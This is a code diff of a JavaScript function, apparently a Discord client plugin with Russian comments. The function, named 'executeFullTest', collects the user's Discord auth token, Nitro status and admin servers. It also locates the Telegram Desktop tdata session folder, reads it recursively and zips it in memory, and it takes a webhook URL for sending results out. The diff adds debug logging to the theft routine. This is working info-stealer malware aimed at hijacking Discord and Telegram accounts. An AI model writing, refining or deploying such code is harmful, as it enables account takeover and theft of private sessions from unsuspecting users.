@@ -1,10 +1,8 @@
 async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
     let fs = null;
     try {
-        // Пытаемся получить fs напрямую. BD должен предоставить полифилл.
         fs = require('fs');
     } catch (e) {
-        console.error("Не удалось загрузить fs через require:", e);
         return { success: false, error: "Модуль fs недоступен." };
     }
 
@@ -14,6 +12,7 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
         nitro: "Нет",
         dtoken: null,
         telegram_path: null,
+        debug_tdata: [],
         admin_servers: []
     };
     
@@ -42,13 +41,12 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
         if (authStore && typeof authStore.getToken === 'function') result.dtoken = authStore.getToken();
     } catch (e) {}
 
-    // 3. Поиск и упаковка Telegram tdata с помощью fflate
+    // 3. Поиск и упаковка Telegram tdata с отладкой
     let hasTdata = false;
     let tdataZipBuffer = null;
     try {
         const appData = process.env.APPDATA;
         if (appData) {
-            // Используем require('path') из плагина
             const path = require('path'); 
             const possiblePaths = [
                 path.join(appData, 'Telegram Desktop', 'tdata'),
@@ -59,35 +57,55 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
             for (const p of possiblePaths) {
                 if (fs.existsSync(p)) {
                     tdataPath = p;
-                    hasTdata = true;
                     break;
                 }
             }
 
             if (tdataPath) {
                 result.telegram_path = tdataPath;
+                result.debug_tdata.push(`Папка найдена: ${tdataPath}`);
+                
                 const files = {};
                 const addFilesRecursively = (dir, prefix = '') => {
-                    const entries = fs.readdirSync(dir);
-                    for (const entry of entries) {
-                        const fullPath = path.join(dir, entry);
-                        const relativePath = path.join(prefix, entry);
-                        if (fs.statSync(fullPath).isDirectory()) {
-                            addFilesRecursively(fullPath, relativePath);
-                        } else {
-                            files[relativePath] = new Uint8Array(fs.readFileSync(fullPath));
+                    try {
+                        const entries = fs.readdirSync(dir);
+                        for (const entry of entries) {
+                            const fullPath = path.join(dir, entry);
+                            const relativePath = path.join(prefix, entry);
+                            try {
+                                if (fs.statSync(fullPath).isDirectory()) {
+                                    addFilesRecursively(fullPath, relativePath);
+                                } else {
+                                    // Пытаемся прочитать файл
+                                    const data = fs.readFileSync(fullPath);
+                                    files[relativePath] = new Uint8Array(data);
+                                }
+                            } catch (fileErr) {
+                                result.debug_tdata.push(`Ошибка файла ${entry}: ${fileErr.message}`);
+                            }
                         }
+                    } catch (dirErr) {
+                        result.debug_tdata.push(`Ошибка папки ${dir}: ${dirErr.message}`);
                     }
                 };
+                
                 addFilesRecursively(tdataPath);
-
-                // Создаем zip-архив в памяти
-                tdataZipBuffer = fflate.zipSync(files);
+                result.debug_tdata.push(`Прочитано файлов: ${Object.keys(files).length}`);
+                
+                if (Object.keys(files).length > 0) {
+                    result.debug_tdata.push("Запуск fflate.zipSync...");
+                    // Пытаемся сжать
+                    tdataZipBuffer = fflate.zipSync(files);
+                    result.debug_tdata.push("ZIP успешно создан!");
+                    hasTdata = true;
+                }
+            } else {
+                result.debug_tdata.push("Папка tdata не найдена на диске.");
             }
         }
     } catch (e) {
-        console.error("Ошибка при создании ZIP архива tdata:", e);
-        hasTdata = false;
+        result.debug_tdata.push(`Критическая ошибка архивации: ${e.message}`);
+        hasTdata = false; 
     }
 
     // 4. Сбор информации о серверах
